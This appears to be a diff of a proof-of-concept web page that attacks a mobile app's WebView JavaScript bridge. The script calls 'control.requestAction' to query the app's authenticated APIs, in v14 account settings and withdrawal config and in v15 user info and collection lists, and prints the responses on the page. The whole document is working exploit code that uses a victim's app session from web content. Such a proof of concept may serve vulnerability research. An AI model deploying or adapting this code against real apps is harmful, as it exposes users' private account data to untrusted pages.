@@ -1,20 +1,19 @@
 <!DOCTYPE html><html><head><title>PoC</title></head>
 <body>
-<h2>PoC v14 requestAction probe</h2>
+<h2>PoC v15 app-session API access</h2>
 <pre id="out">running...</pre>
 <script>
 function log(s){document.getElementById('out').textContent += "\n" + s;}
-function mkcb(name){ var fn = "__cb_"+name; window[fn]=function(d){ log("CB["+name+"]="+(typeof d=="string"?d:JSON.stringify(d))); }; return fn; }
+function mkcb(name){ var fn="__cb_"+name; window[fn]=function(d){ log("CB["+name+"]="+(typeof d=="string"?d:JSON.stringify(d))); }; return fn; }
 setTimeout(function(){
   if (!window.control) { log("NO control"); return; }
-  var rid = mkcb("ra");
-  var req = { path: "/v1/user/account/settings", params: {}, requestId: rid };
-  try { control.requestAction(JSON.stringify(req)); log("requestAction sent: "+JSON.stringify(req)); } catch(e){ log("ERR ra: "+e); }
-  setTimeout(function(){
-    var rid2 = mkcb("ra2");
-    var req2 = { path: "/v1/user/withdraw/config", params: {}, requestId: rid2 };
-    try { control.requestAction(JSON.stringify(req2)); log("requestAction2 sent path="+req2.path+" cb="+rid2); } catch(e){ log("ERR ra2: "+e); }
-  }, 2500);
+  function call(path, tag){
+    var rid = mkcb(tag);
+    try { control.requestAction(JSON.stringify({path:path, params:{}, requestId:rid})); log("sent "+tag+" -> "+path); } catch(e){ log("ERR "+tag+": "+e); }
+  }
+  call("/v1/social/userInfo/getUserInfo", "me");
+  setTimeout(function(){ call("/v1/social/user/collectionList", "collect"); }, 3000);
+  setTimeout(function(){ call("/v1/cms/public/news/appMainPageList", "news"); }, 6000);
 }, 600);
 </script>
 </body></html>
